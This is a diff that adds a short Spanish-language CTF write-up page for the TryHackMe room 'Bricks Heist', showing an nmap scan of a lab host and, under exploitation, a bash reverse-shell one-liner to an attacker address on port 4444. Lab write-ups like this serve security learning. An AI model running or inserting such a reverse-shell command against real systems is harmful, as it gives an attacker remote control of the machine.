@@ -1,0 +1,22 @@
+---
+import CTFLayout from '../../layouts/CTFLayout.astro';
+---
+
+<CTFLayout title="Bricks Heist – TryHackMe">
+  <h1 class="text-3xl font-bold mb-4">Bricks Heist – TryHackMe</h1>
+  <p class="text-sm text-gray-400 mb-6">Plataforma: TryHackMe</p>
+
+  <h2 class="text-xl font-semibold">🧠 Descripción</h2>
+  <p>WordPress comprometido. RCE sin auth. Proceso minero. Grupo LockBit.</p>
+
+  <h2 class="text-xl font-semibold mt-6">🔍 Recon</h2>
+  <pre><code>nmap -sCV -p- 10.10.72.226</code></pre>
+  <ul class="list-disc ml-6">
+    <li>22/tcp: SSH</li>
+    <li>80/tcp: Apache</li>
+    <li>443/tcp: WordPress</li>
+  </ul>
+
+  <h2 class="text-xl font-semibold mt-6">💥 Explotación</h2>
+  <pre><code>bash -i >& /dev/tcp/10.5.0.2/4444 0>&1</code></pre>
+</CTFLayout>
